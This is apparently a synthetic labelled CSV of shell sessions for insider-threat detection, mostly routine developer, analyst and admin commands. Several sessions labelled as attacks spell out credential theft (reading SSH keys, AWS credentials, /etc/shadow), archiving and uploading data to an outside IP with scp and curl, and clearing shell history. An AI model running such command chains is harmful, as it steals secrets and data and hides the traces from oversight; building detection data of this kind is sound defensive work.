session_id,user_id,role,hostname,session_start,session_duration_s,after_hours,command_count,command_sequence,label,attack_type
9cfbe382a312459cb95900f30472346f,u0024,analyst,dev-ws-03,2025-07-13 14:33:22,2777,0,31,"cat /data/embeddings.npy -> arp -a -> clear -> sqlite3 analytics.db 'SELECT COUNT(*) FROM logs;' -> which git -> history | tail -<NUM> -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/debug.log | wc -l -> awk '{print $1}' /var/log/nginx.log | sort | uniq -c | sort -rn | head -<NUM> -> python -c 'import pandas as pd; df=pd.read_csv(""/data/model_weights.pkl""); print(df.describe())' -> cd ~ -> echo $PATH -> python analyze.py --input /data/model_weights.pkl -> pwd -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/error.log | wc -l -> wc -l /data/payroll.xlsx -> du -sh /data/* -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> ls -> ls -lh /data -> env | grep -i token -> cat /data/embeddings.npy -> wc -l /data/customers.csv -> diff /data/model_weights.pkl /backup/embeddings.npy -> python analyze.py --input /data/report.parquet -> alias ll='ls -la' -> sort -t',' -k4 -n /data/customers.csv | tail -<NUM> -> ls -lh -> source ~/.bashrc -> ls -> pwd -> exit",1,none
dab8b6a06a6f4b2cb54204c72c22ab99,u0064,analyst,analyst-ws-08,2025-07-13 17:51:21,278,0,21,"head -<NUM> /data/payroll.xlsx -> date -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> cta README.md -> python analyze.py --input /data/model_weights.pkl --output /tmp/<TMPFILE> -> sort -t',' -k4 -n /data/transactions.csv | tail -<NUM> -> python analyze.py --input /data/payroll.xlsx -> awk '{print $1}' /var/log/access.log | sort | uniq -c | sort -rn | head -<NUM> -> alias ll='ls -la' -> head -<NUM> /data/transactions.csv -> psql -U analyst -c 'SELECT * FROM summary LIMIT <NUM>;' -> clear -> sqlite3 analytics.db 'SELECT COUNT(*) FROM sessions;' -> md5sum /data/model_weights.pkl -> scp /tmp/<TMPFILE> data-lake:/backup/ -> wc -l /data/report.parquet -> which python -> python analyze.py --input /data/embeddings.npy --output /tmp/<TMPFILE> -> which git -> ls -> exit",0,none
3858579e56564c3bb8c6d5394b09aad8,u0062,dev,dev-ws-01,2025-07-13 18:01:54,2365,0,10,cd ~/projects/ml-pipeline -> clear -> pip install pandas -> journalctl -xe --since '<NUM> hour ago' -> ss -tlnp -> ss -tlnp -> make build -> nano config/dev.yaml -> find . -name '*.py' | xargs wc -l -> exit,0,none
33124726a5f54a5c9362d8948627154a,u0068,analyst,dev-ws-02,2025-07-13 18:08:33,3037,0,16,"date -> find /home -name '*.pem' 2>/dev/null -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> scp /tmp/<TMPFILE> archive-srv:/backup/ -> ls -> id -> which python -> wc -l /data/transactions.csv -> sort -t',' -k3 -n /data/payroll.xlsx | tail -<NUM> -> sqlite3 analytics.db 'SELECT COUNT(*) FROM events;' -> python -c 'import pandas as pd; df=pd.read_csv(""/data/transactions.csv""); print(df.describe())' -> psql -U analyst -c 'SELECT * FROM daily_stats LIMIT <NUM>;' -> history | tail -<NUM> -> ls -lh -> tar -czf /tmp/<TMPFILE> ~/ -> exit",1,none
db9f6db41b424ecd9163765f4a401f9c,u0046,analyst,admin-srv-01,2025-07-13 21:03:56,3291,1,36,"cat /data/model_weights.pkl -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> grep -i 'fail' /var/log/debug.log -> cd ~ -> pwd -> cut -d',' -f3,<NUM> /data/users.db | head -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/auth.log | wc -l -> awk '{print $1}' /var/log/syslog | sort | uniq -c | sort -rn | head -<NUM> -> cut -d',' -f2,8 /data/customers.csv | head -> python analyze.py --input /data/payroll.xlsx -> source ~/.bashrc -> sort -t',' -k5 -n /data/users.db | tail -<NUM> -> psql -U analyst -c 'SELECT * FROM events LIMIT <NUM>;' -> clear -> less /var/log/error.log -> history | tail -<NUM> -> sort -t',' -k3 -n /data/users.db | tail -<NUM> -> grep -i 'error' /var/log/access.log -> diff /data/payroll.xlsx /backup/users.db -> python -c 'import pandas as pd; df=pd.read_csv(""/data/users.db""); print(df.describe())' -> md5sum /data/transactions.csv -> ls -lh /data -> scp /tmp/<TMPFILE> archive-srv:/backup/ -> cut -d',' -f3,8 /data/customers.csv | head -> which git -> whoami -> find /data -name '*.xlsx' -mtime -<NUM> -> find /var/log -name '*.log' -size +33M -> tar -czf /tmp/<TMPFILE> /data/ 2>/dev/null -> split -b 58M /tmp/<TMPFILE> /tmp/<TMPFILE> -> scp /tmp/<TMPFILE> root@<IP>:/uploads/ -> curl -s -F 'file=@/tmp/<TMPFILE> http://<IP>:<NUM>/upload -> rm -f /tmp/<TMPFILE> /tmp/<TMPFILE> -> history -c -> alias ll='ls -la' -> exit",2,exfil
bc2f8ff14acb467a9af1965185925005,u0077,dev,admin-srv-02,2025-07-14 01:14:33,1620,1,15,cd ~ -> pip install cryptography -> git pull origin develop -> clear -> make test -> ls -lh -> make test -> docker ps -> cd .. -> pwd -> docker build -t myapp:0cef . -> git status -> whoami -> ls -la -> exit,0,none
d4373c90127943e796c2976dd1f6a183,u0048,analyst,dev-ws-01,2025-07-14 14:37:32,832,0,14,ls -> rsync -avz /data/ nas-store:/backup/data/ -> less /var/log/access.log -> arp -a -> getent passwd -> cd ~ -> cd .. -> ip neigh show -> last | head -<NUM> -> awk '{print $1}' /var/log/nginx.log | sort | uniq -c | sort -rn | head -<NUM> -> netstat -an | grep ESTABLISHED -> ls -la -> ls -la ~/.ssh/ -> exit,1,none
23cf7fc65e174bbb87838faeebca36c7,u0055,dev,admin-srv-08,2025-07-14 14:41:27,1245,0,10,grep -r 'TODO' src/ -> ssh -i ~/.ssh/id_rsa deploy@build-agent -> history | tail -<NUM> -> pip install -r requirements.txt -> git pull origin main -> docker build -t myapp:2a42 . -> docker ps -> pip install sqlalchemy -> docker build -t myapp:baa4 . -> exit,0,none
83063b50ffb3487ba8e2bae530ce17ad,u0029,analyst,admin-srv-08,2025-07-14 16:22:33,2759,0,19,"pwd -> !! -> history | tail -<NUM> -> rsync -avz /data/ data-lake:/backup/data/ -> history | tail -<NUM> -> ls -lh /data -> ls -> ls -> sort -t',' -k1 -n /data/transactions.csv | tail -<NUM> -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/audit.log | wc -l -> jupyter nbconvert --to script analysis_be8c.ipynb -> which git -> ls -lh /data -> diff /data/payroll.xlsx /backup/model_weights.pkl -> grep -i 'warn' /var/log/syslog -> sort -t',' -k3 -n /data/users.db | tail -<NUM> -> cd ~ -> rsync -avz /data/ backup-<NUM>:/backup/data/ -> exit",0,none
4ba00b3940574492aceb1411668450d0,u0051,analyst,dev-ws-02,2025-07-14 18:01:01,1866,0,43,"cat /data/model_weights.pkl -> alias ll='ls -la' -> pwd -> head -<NUM> /data/model_weights.pkl -> ls -la -> date -> ls -lh -> cat ~/.ssh/id_rsa -> find / -name 'id_rsa' 2>/dev/null | head -5 -> find / -name '*.pem' 2>/dev/null | head -5 -> cat ~/.aws/credentials -> cat ~/.aws/config -> env | grep -iE 'pass' -> cat /etc/passwd -> tar -czf /tmp/<TMPFILE> ~/.ssh/ ~/.aws/ 2>/dev/null -> scp /tmp/<TMPFILE> ubuntu@<IP>:/tmp/<TMPFILE> -> rm -f /tmp/<TMPFILE> -> history -c -> pwd -> source ~/.bashrc -> jupyter nbconvert --to script analysis_4cfc.ipynb -> awk '{print $1}' /var/log/nginx.log | sort | uniq -c | sort -rn | head -<NUM> -> ls -lh -> python -c 'import pandas as pd; df=pd.read_csv(""/data/transactions.csv""); print(df.describe())' -> cd ~ -> history | tail -<NUM> -> pwd -> ls -> date -> head -<NUM> /data/payroll.xlsx -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> wc -l /data/report.parquet -> ls -lh -> alias ll='ls -la' -> scp /tmp/<TMPFILE> backup-<NUM>:/backup/ -> ls -> scp /tmp/<TMPFILE> data-lake:/backup/ -> history | tail -<NUM> -> rsync -avz /data/ nas-store:/backup/data/ -> python analyze.py --input /data/report.parquet -> cd .. -> alias ll='ls -la' -> exit",2,credential_harvest
0f53f6a8ca194a2cb193a31313d7d9a2,u0023,analyst,dev-ws-13,2025-07-14 18:53:11,70,0,14,"echo $PATH -> sqlite3 analytics.db 'SELECT COUNT(*) FROM events;' -> scp /tmp/<TMPFILE> staging-<NUM>:/backup/ -> scp /tmp/<TMPFILE> nas-store:/backup/ -> du -sh /data/* -> ls -la -> python -c 'import pandas as pd; df=pd.read_csv(""/data/report.parquet""); print(df.describe())' -> source ~/.bashrc -> wc -l /data/users.db -> which git -> cd ~ -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> md5sum /data/transactions.csv -> exit",0,none
e27d1245fc39452abdd236597560c26f,u0075,analyst,admin-srv-02,2025-07-14 21:17:24,2529,1,27,"which python -> cat /dev/null > ~/.bash_history -> cut -d',' -f2,7 /data/model_weights.pkl | head -> ls -lh /data -> which git -> psql -U analyst -c 'SELECT * FROM daily_stats LIMIT 5;' -> grep -i 'fail' /var/log/error.log -> diff /data/model_weights.pkl /backup/users.db -> head -<NUM> /data/payroll.xlsx -> source ~/.bashrc -> cat /data/report.parquet -> sort -t',' -k5 -n /data/payroll.xlsx | tail -<NUM> -> ip a -> which python -> sqlite3 analytics.db 'SELECT COUNT(*) FROM events;' -> pwd -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> python -c 'import pandas as pd; df=pd.read_csv(""/data/transactions.csv""); print(df.describe())' -> date -> awk '{print $1}' /var/log/error.log | sort | uniq -c | sort -rn | head -<NUM> -> echo $PATH -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> rsync -avz /data/ log-collector:/backup/data/ -> psql -U analyst -c 'SELECT * FROM summary LIMIT <NUM>;' -> cd .. -> diff /data/users.db /backup/users.db -> exit",0,none
8deefb43e65842999d8a15c5efd27bb3,u0022,dev,admin-srv-01,2025-07-15 11:24:14,1254,0,23,docker logs <HEX> --tail <NUM> -> docker ps -> git pull origin main -> cd ~/projects/auth-service -> export ENV=true -> python sync.py -> export DEBUG=false -> cat logs/error.log -> git stash -> git pull origin develop -> pip install fastapi -> black src/ -> docker run --rm -p <NUM>:<NUM> myapp:latest -> uptime -> man awk -> pip install requests -> git diff HEAD~1 -> cd ~ -> echo $USER -> env | grep API -> grep -r 'TODO' src/ -> docker ps -> exit,0,none
6054389527a1468aa722412ec87fc9c1,u0001,analyst,admin-srv-05,2025-07-15 12:37:08,2526,0,27,"cat /data/users.db -> whoami -> head -<NUM> /data/transactions.csv -> history | tail -<NUM> -> echo $USER -> grep -E '[0-9]{4}-[0-9]{2}-[0-9]{2}' /var/log/syslog | wc -l -> sort -t',' -k2 -n /data/customers.csv | tail -<NUM> -> scp /tmp/<TMPFILE> build-agent:/backup/ -> cat /data/users.db -> source ~/.bashrc -> awk '{print $1}' /var/log/audit.log | sort | uniq -c | sort -rn | head -<NUM> -> pwd -> ls -lh -> wc -l /data/transactions.csv -> clear -> du -sh /data/* -> ls -la -> cat /data/report.parquet -> ls -> pwd -> source ~/.bashrc -> wc -l /data/users.db -> python analyze.py --input /data/embeddings.npy -> ls -lh /data -> cd ~ -> source ~/.bashrc -> exit",0,none
c4bd86fce1ea47f2895ab02aed237c72,u0035,admin,analyst-ws-07,2025-07-15 12:56:53,1928,0,31,sudo chmod <NUM> /etc/nginx/nginx.conf -> ls -la -> journalctl -xe --since '<NUM> hour ago' -> journalctl -u cron -n <NUM> -> sudo systemctl status celery -> sudo -l -> du -sh /var/log/* -> find /home -name '*.pfx' 2>/dev/null -> df -h -> uptime -> netstat -tulpn -> history | tail -<NUM> -> journalctl -xe --since '8 hour ago' -> ip route show -> sudo systemctl status ssh -> sudo ufw status verbose -> netstat -tulpn -> sudo -l -> journalctl -u gunicorn -n <NUM> -> sudo -l -> top -bn1 | head -<NUM> -> ping -c 6 <IP> -> cd ~ -> sudo apt update -> cd .. -> ip neigh show -> giit pull -> iostat -x 1 3 -> sudo nano /etc/hosts -> sudo systemctl enable docker -> exit,1,none
dca8fc5321104af6be7bc86ab27fb0b2,u0011,admin,analyst-ws-02,2025-07-15 13:37:22,2798,0,28,pwd -> cd .. -> cat /var/log/error.log -> sudo -l -> history | tail -<NUM> -> echo $PATH -> sudo nano /etc/resolv.conf -> free -m -> vmstat 1 5 -> source ~/.bashrc -> sudo chmod <NUM> /etc/nginx/nginx.conf -> alias ll='ls -la' -> sudo ufw allow <NUM>/tcp -> sudo -l -> cd ~ -> sudo apt update -> sudo journalctl --since '1 days ago' | grep -i fail -> sudo -l -> ls -la -> pwd -> date -> df -h -> netstat -tulpn -> uptime -> md5sum /data/model_weights.pkl -> awk '{print $1}' /var/log/access.log | sort | uniq -c | sort -rn | head -<NUM> -> cat /data/model_weights.pkl -> exit,0,none
53940ba5557b45d1ac3ff9e04b423003,u0059,dev,analyst-ws-05,2025-07-15 16:33:03,2512,0,30,pip list --outdated -> git diff HEAD~1 -> uptime -> pip list --outdated -> docker ps -> env | grep API -> git checkout -b feature/<HEX> -> ip a -> cat config/prod.yaml -> grep -r 'TODO' src/ -> scp logs.tar.gz staging-<NUM>:/backup/ -> git pull origin main -> curl -s http://localhost:<NUM>/health -> ls -la -> cd ~ -> python train.py -> tail -f logs/debug.log -> pip install requests -> docker ps -> ls -> ls -la -> git stash -> ls -la -> ls -lh -> echo $USER -> python deploy.sh -> python deploy.sh -> curl -s http://localhost:<NUM>/health -> cd .. -> exit,0,none
ac1e8c6983d74fe4b2bd75bcc319059b,u0013,analyst,analyst-ws-10,2025-07-15 17:11:07,352,0,15,"cd .. -> whoami -> less /var/log/app.log -> psql -U analyst -c 'SELECT * FROM daily_stats LIMIT <NUM>;' -> uptime -> history | tail -<NUM> -> ls -lh -> source ~/.bashrc -> pwd -> clear -> echo $USER -> which git -> sort -t',' -k4 -n /data/transactions.csv | tail -<NUM> -> grep -i 'fail' /var/log/access.log -> exit",0,none
ff3b2d15a4684494b55647374887b7b0,u0054,dev,analyst-ws-02,2025-07-15 17:51:21,985,0,13,docker ps -> groups -> nano config/dev.yaml -> git pull origin develop -> ping -c 9 <IP> -> ls -lh -> find / -perm -<NUM> 2>/dev/null -> ls -la -> ls -> python -m pytest tests/ -v -> arp -a -> ls -> exit,1,none
1dba4299210d4007bc383dab83c8dcfd,u0004,dev,analyst-ws-08,2025-07-16 06:05:04,383,1,27,history | tail -<NUM> -> tail -f logs/syslog -> find . -name '*.py' | xargs wc -l -> ls -> ls -> pytest tests/unit/ --cov=src --cov-report=term-missing -> ls -lh -> nano config/settings.yaml -> echo $USER -> which python -> alias ll='ls -la' -> netstat -an | grep ESTABLISHED -> cat /etc/group -> docker logs <HEX> --tail <NUM> -> grep -r 'TODO' src/ -> whoami -> git checkout -b feature/<HEX> -> git status -> history | tail -<NUM> -> cd ~/projects/data-lake -> cp /etc/passwd /tmp/<TMPFILE> -> docker logs <HEX> --tail <NUM> -> git stash -> cd ~ -> sudo -l -> nano config/settings.yaml -> exit,1,none
d46775ee2c954524a04071d9f95e5e17,u0047,dev,dev-ws-09,2025-07-16 08:32:39,1191,0,26,git pull origin main -> docker ps -> ssh -i ~/.ssh/id_rsa deploy@build-agent -> echo $PATH -> curl -s http://localhost:<NUM>/health -> export DEBUG=production -> env | grep SECRET -> cat config/settings.yaml -> make build -> cd ~ -> git pull origin develop -> flake8 src/ --max-line-length <NUM> -> make test -> source ~/.bashrc -> python train.py -> date -> git status -> git checkout -b feature/<HEX> -> git stash -> ls -la -> pwd -> docker logs <HEX> --tail <NUM> -> man sed -> uptime -> cd ~/projects/ml-pipeline -> exit,0,none
5cbc791a84574f2686b0317df0dfc495,u0004,dev,analyst-ws-05,2025-07-16 10:21:56,3032,0,12,cat config/dev.yaml -> git diff HEAD~2 -> sudo systemctl status auditd -> uptime -> flake8 src/ --max-line-length <NUM> -> git status -> find . -name '*.py' | xargs wc -l -> source ~/.bashrc -> env | grep DATABASE -> docker build -t myapp:710f . -> curl -s http://localhost:<NUM>/health -> exit,0,none
d8095fe25d66447b905bd7b0820f5762,u0067,dev,analyst-ws-12,2025-07-16 10:31:27,3525,0,16,curl -s http://localhost:<NUM>/health -> git log --oneline -<NUM> -> date -> git diff HEAD~2 -> alias ll='ls -la' -> cat config/prod.yaml -> grep -r 'TODO' src/ -> env | grep DATABASE -> source ~/.bashrc -> pip list --outdated -> python -m pytest tests/ -x -> cd ~ -> which python -> env | grep DATABASE -> source ~/.bashrc -> exit,0,none
f62b570d6e4a4738bb7d2b271decfbe0,u0069,admin,dev-ws-03,2025-07-16 13:03:46,3218,0,24,ls -> sudo chmod <NUM> /etc/nginx/nginx.conf -> cat /var/log/syslog -> grep -i 'error\|warn' /var/log/syslog | tail -<NUM> -> history | tail -<NUM> -> tail -f /var/log/syslog -> cd .. -> sudo iptables -L -n -> top -bn1 | head -<NUM> -> last | head -<NUM> -> history | tail -<NUM> -> iostat -x 1 3 -> sudo chown www-data /var/www/html -> sudo iptables -L -n -> sudo ufw status verbose -> alias ll='ls -la' -> journalctl -u redis -n <NUM> -> cd .. -> tail -f /var/log/syslog -> sudo ufw allow <NUM>/tcp -> alias ll='ls -la' -> echo $USER -> ss -tlnp -> exit,0,none
14af82fb96264bd1b54b1c431fa08eea,u0078,dev,dev-ws-15,2025-07-16 13:20:22,1251,0,18,pwd -> cat ~/.gitconfig -> ssh -i ~/.ssh/id_rsa deploy@dev-<NUM> -> git checkout -b feature/<HEX> -> git stash -> ls -la -> alias ll='ls -la' -> git checkout -b feature/<HEX> -> grep -r 'TODO' src/ -> cat logs/syslog -> black src/ -> ls -la -> cat /etc/group -> ls -> arp -a -> find / -perm -<NUM> 2>/dev/null -> sudo -l -> exit,1,none
b3b00b16257f456897ae08012968b960,u0048,analyst,analyst-ws-11,2025-07-16 13:56:39,2191,0,23,"sqlite3 analytics.db 'SELECT COUNT(*) FROM audit;' -> source ~/.bashrc -> pwd -> history | tail -<NUM> -> wc -l /data/customers.csv -> psql -U analyst -c 'SELECT * FROM daily_stats LIMIT <NUM>;' -> wc -l /data/payroll.xlsx -> pwd -> cat /data/users.db -> grep -i 'error' /var/log/app.log -> whoami -> head -<NUM> /data/embeddings.npy -> source ~/.bashrc -> sort -t',' -k2 -n /data/transactions.csv | tail -<NUM> -> date -> wc -l /data/transactions.csv -> !! -> wc -l /data/report.parquet -> cd .. -> cd .. -> sort -t',' -k1 -n /data/model_weights.pkl | tail -<NUM> -> scp /tmp/<TMPFILE> staging-<NUM>:/backup/ -> exit",0,none
d5bc693f662e425faa67aec420b466bc,u0066,dev,dev-ws-11,2025-07-16 17:06:50,2655,0,32,echo $USER -> find /home -name '*.pem' 2>/dev/null -> which git -> alias ll='ls -la' -> git pull origin develop -> git pull origin develop -> docker build -t myapp:<NUM> . -> ip neigh show -> which python -> export ENV=true -> grep -r 'TODO' src/ -> cd ~ -> find . -name '*.py' | xargs wc -l -> git checkout -b feature/<HEX> -> source ~/.bashrc -> alias ll='ls -la' -> which python -> clear -> cat config/prod.yaml -> clear -> docker ps -> ip route show -> ls -> cd ~/projects/billing-svc -> ls -la -> docker run --rm -p <NUM>:<NUM> myapp:latest -> ls -la -> cd .. -> cat ~/.gitconfig -> export DEBUG=info -> docker build -t myapp:48d0 . -> exit,1,none
ad78a42186594a90933b5f3bf4f9f78a,u0019,analyst,analyst-ws-10,2025-07-16 18:16:08,1042,0,14,"pwd -> sudo -l -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> cp /etc/passwd /tmp/<TMPFILE> -> find / -perm -<NUM> 2>/dev/null -> ls -la ~/.aws/ -> ls -lh -> ls -> cut -d',' -f1,9 /data/payroll.xlsx | head -> python analyze.py --input /data/model_weights.pkl --output /tmp/<TMPFILE> -> ls -lh /data -> whoami -> uptime -> exit",1,none
6c65c3098eaf4b4cb922ef1c5a228874,u0071,analyst,dev-ws-14,2025-07-17 08:21:48,1294,0,12,"python -c 'import pandas as pd; df=pd.read_csv(""/data/customers.csv""); print(df.describe())' -> sort -t',' -k1 -n /data/report.parquet | tail -<NUM> -> python analyze.py --input /data/embeddings.npy -> which git -> scp /tmp/<TMPFILE> archive-srv:/backup/ -> source ~/.bashrc -> pyhton -m pytest -> man grep -> diff /data/model_weights.pkl /backup/customers.csv -> ls -la -> ls -> exit",0,none
f131088201004d798f07a66cc00a4423,u0045,analyst,analyst-ws-12,2025-07-17 08:25:00,1989,0,45,"python -c 'import pandas as pd; df=pd.read_csv(""/data/payroll.xlsx""); print(df.describe())' -> sort -t',' -k2 -n /data/embeddings.npy | tail -<NUM> -> whoami -> ls -la ~/.aws/ -> python analyze.py --input /data/users.db --output /tmp/<TMPFILE> -> zip -r /tmp/<TMPFILE> /data/ -> cd ~ -> grep -i 'error' /var/log/audit.log -> ls -lh /data -> sort -t',' -k4 -n /data/report.parquet | tail -<NUM> -> cut -d',' -f3,8 /data/embeddings.npy | head -> ls -la -> whoami -> grep -i 'warn' /var/log/auth.log -> less /var/log/error.log -> tar -czf /tmp/<TMPFILE> /var/log/ 2>/dev/null -> python analyze.py --input /data/customers.csv --output /tmp/<TMPFILE> -> ls -lh -> uptime -> psql -U analyst -c 'SELECT * FROM users LIMIT <NUM>;' -> awk '{print $1}' /var/log/app.log | sort | uniq -c | sort -rn | head -<NUM> -> less /var/log/audit.log -> ls -lh -> find /data -name '*.parquet' -mtime -5 -> find /var/log -name '*.log' -size +8M -> tar -czf /tmp/<TMPFILE> /data/ 2>/dev/null -> cp /etc/shadow /tmp/<TMPFILE> -> split -b 177M /tmp/<TMPFILE> /tmp/<TMPFILE> -> scp /tmp/<TMPFILE> svc-acct@<IP>:/uploads/ -> curl -s -F 'file=@/tmp/<TMPFILE> http://<IP>:<NUM>/upload -> rm -f /tmp/<TMPFILE> /tmp/<TMPFILE> -> history -c -> which python -> history | tail -<NUM> -> cat /etc/cron.d/logrotate -> echo $USER -> less /var/log/debug.log -> ls -la -> clear -> rsync -avz /data/ nas-store:/backup/data/ -> python analyze.py --input /data/report.parquet --output /tmp/<TMPFILE> -> uptime -> source ~/.bashrc -> scp /tmp/<TMPFILE> staging-<NUM>:/backup/ -> exit",2,exfil__pivot
